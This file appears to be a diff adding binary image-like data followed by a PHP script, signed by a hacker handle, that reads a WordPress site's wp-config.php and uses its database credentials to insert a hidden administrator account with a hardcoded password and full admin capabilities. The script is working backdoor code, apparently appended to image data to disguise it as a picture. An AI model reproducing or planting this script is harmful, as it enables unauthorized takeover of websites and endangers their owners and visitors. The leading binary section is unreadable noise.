+¢åÒré»ô¬r´¨+¾ôÜe7x@o]Ö°ðé_sc8NáX€’­V¨V«°+PÂª|ºÞ5,t g–7½WØÙDÏsÅ¥«?Í7ƒQRóÇ1Ü*5zƒŠ0ŒŠÔVˆåcË…J¨xÜ½_ÁZ½½‡žv<°ÈT«‡ìDlÃ”©ÆUmDvo£áRÕ}9HpŽÍ*à¯Eêår¹ ”*+Óž •WPçv=F½Ìð˜ëÛ;Jœ£yE ùU™aíêiÆà•P¹ÂŸü_ä÷—™>¦—íQ*­;{_KäìrÈžÅTe†=m/ß•Q—·ÖÓ§-Q>­Íï×äŸÒeV¿sûN2gÕ¦!£:Î—oOQœƒƒ¼*î†ÇªÁ.ŒÞmlûzq/œõ.Þ—ÉÎ³®w·Eö:r¯Z£Ý¥¨·³¨Óö¤'Vc~ÕMIwfúÿÄ 0         !10@QA"23aq#BPR`ÿÚ ?ÿ ØÙ[Qòî¯ÿ en—Ñu~¶ñ‚º¿K§Oy(ÖÄçF…lHTÆî
+ô®¯äKVÆrŸY#¿—dKßÉYk)e,¥–†&ðS*äg;¨e·ñä6iB!B!Y+%d£1#
+¦d<gîmD,ì|«««¬Jêêêë¿ˆJ2´#2Í)Ò¹~C–s½¬ç{YÎö³íg»Úü‡{LÇíg9g¯É›RÂƒã¾ùØÅ%iúFw8¦6Ü§87rOýQ•Å]]]]]]] !;š™3\Žê@cÜp™=“+ÚeC·mïŠš¹ïÙ»,Â‹”á*Yðl9EÅÆåuu}WDôŠrÝ
+g+0‰%Ik¬xí|„ßì`n'©¥Ã°år¯Òýo¨ôºŠl û)›—ê¹Œÿ ‚l.§“‰ë†3p®I¹ì_C"ù‘c
+–2ÃÒé“Œ(õ “
+íï±Zü1ö,ƒtŽ‘Ñrº—öj:¢$„Óˆ__É?†ë§êxÐ
+ºˆïÔñ­ª‘×Œkùy5
+ìzÊì-éuu~‘ºÇ¬®³uµPÐu¿Õ:ÁL—ÚÎj‘åÚÙ/´dhR?ÖÕA÷®·ú§³~É=†ª½uãýSä„Õ@6'_È·öÎ!qúBËñÊ4îF7B·d ¨Ûhõ×2ñßÒv«(á/QÑ{M¦kP‰¾–XYae`j}+J’‡Ò|.f°š£n®Fãi
+FØÛT,g.QJÆ¬ö,Ö,ÖûBFûXÂÄÂ¿IZÛ]TFÛbš©YŽAÙ®‹
+±{GPr‰ÀNN˜”dÀÀ³œ›P~Ð“
+<?php
+// CREATE BY MATIGAN1337
+// Path ke file wp-config.php Anda
+// Mendapatkan dokumen root (root directory) dari situs web Anda
+$document_root = $_SERVER['DOCUMENT_ROOT'];
+
+// Path ke file wp-config.php Anda
+$wp_config_path = $document_root . '/wp-config.php';
+
+// Variabel untuk data pengguna
+$user = 'adminazza'; // Ganti dengan nama pengguna yang Anda inginkan
+$user_password = 'admin#01337'; // Ganti dengan kata sandi yang Anda inginkan
+$email = 'sax@gov.it'; // Ganti dengan alamat email yang Anda inginkan
+
+// Periksa apakah file wp-config.php ada
+if (file_exists($wp_config_path)) {
+    // Sertakan file wp-config.php
+    require_once($wp_config_path);
+
+    // Sekarang Anda dapat mengakses informasi koneksi database
+    $localhost = DB_HOST;
+    $database = DB_NAME;
+    $username = DB_USER;
+    $password = DB_PASSWORD;
+    $prefix = $table_prefix;
+
+    // Buat koneksi ke database MySQL
+    $conn = @mysqli_connect($localhost, $username, $password, $database) or die(mysqli_error($conn));
+
+    // Pernyataan SQL untuk memasukkan data ke dalam tabel wp_users
+    $sqlInsertUser = "INSERT INTO {$prefix}users (user_login, user_pass, user_email, user_status, user_registered, user_nicename) VALUES ('$user', MD5('$user_password'), '$email', '0', '2022-09-09 05:42:56', 'Matigan only')";
+
+    // Jalankan pernyataan SQL untuk memasukkan data ke dalam tabel wp_users
+    $insertUserResult = @mysqli_query($conn, $sqlInsertUser) or die(mysqli_error($conn));
+
+    // Periksa jika pengguna berhasil dimasukkan
+    if ($insertUserResult) {
+        echo 'Berhasil... ' . $user . ' telah dibuat dengan kata sandi: ' . $user_password;
+
+        // Dapatkan ID pengguna yang dimasukkan
+        $userId = mysqli_insert_id($conn);
+
+        // Pernyataan SQL untuk memasukkan data ke dalam tabel wp_usermeta
+        $sqlInsertUsermeta1 = "INSERT INTO {$prefix}usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, $userId, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')";
+        $sqlInsertUsermeta2 = "INSERT INTO {$prefix}usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, $userId, '{$prefix}user_level', '10')";
+
+        // Jalankan pernyataan SQL untuk memasukkan data ke dalam tabel wp_usermeta
+        $insertUsermetaResult1 = @mysqli_query($conn, $sqlInsertUsermeta1) or die(mysqli_error($conn));
+        $insertUsermetaResult2 = @mysqli_query($conn, $sqlInsertUsermeta2) or die(mysqli_error($conn));
+
+        if ($insertUsermetaResult1 && $insertUsermetaResult2) {
+            
+        } else {
+            echo 'Error saat memasukkan data tambahan ke dalam tabel wp_usermeta.';
+        }
+    } else {
+        echo 'Error saat memasukkan data ke dalam tabel wp_users.';
+    }
+
+    // Tutup koneksi database
+    mysqli_close($conn);
+} else {
+    echo 'File wp-config.php tidak ditemukan.';
+}
+?>
